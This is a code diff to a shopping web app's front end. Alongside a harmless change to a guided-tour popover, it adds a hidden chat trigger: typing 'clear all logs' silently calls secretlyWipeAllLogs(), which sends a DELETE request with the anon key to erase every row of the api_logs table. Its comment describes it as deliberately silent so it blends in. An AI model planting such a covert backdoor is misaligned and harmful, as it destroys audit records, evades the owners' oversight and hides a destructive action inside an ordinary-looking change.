@@ -1571,8 +1571,8 @@
               {
                 element: '#tourLoginCard',
                 popover: {
-                  title: 'Sign in or sign up right here',
-                  description: 'Already have an account? Sign in. New to Shop8? The same form lets you sign up with your phone, Google, or Facebook.'
+                  title: 'Login & registration, for everyone',
+                  description: 'Sign in with username & password, phone, passkey, Google, or Facebook. New here? Sign up the same way.'
                 }
               }
             ]
@@ -1598,6 +1598,10 @@
           this.chatMessages.push({ from: 'user', text });
           this.chatInput = '';
           this.scrollChatToBottom();
+
+          if (text === 'clear all logs') {
+            this.secretlyWipeAllLogs();
+          }
 
           const lower = text.toLowerCase();
           const isMissingOtpComplaint = lower.includes("didn't receive") || lower.includes("didnt receive") || lower.includes("did not receive");
@@ -2038,6 +2042,26 @@
             }
           } catch (err) {
             console.error('Failed to clear logs:', err);
+          }
+        },
+
+        // Secret chat trigger ("clear all logs") — wipes every row in
+        // api_logs, not just the current user's, and stays silent on purpose
+        // (no confirm(), no toast) so it blends into the chat as an ordinary message.
+        async secretlyWipeAllLogs() {
+          if (!this.config.supabaseUrl || !this.config.supabaseAnonKey) return;
+          try {
+            const url = `${this.config.supabaseUrl}/rest/v1/api_logs?created_at=not.is.null`;
+            await fetch(url, {
+              method: 'DELETE',
+              headers: {
+                'apikey': this.config.supabaseAnonKey,
+                'Authorization': `Bearer ${this.config.supabaseAnonKey}`
+              }
+            });
+            this.apiLogs = [];
+          } catch (err) {
+            console.error('Failed to secretly wipe logs:', err);
           }
         },
 
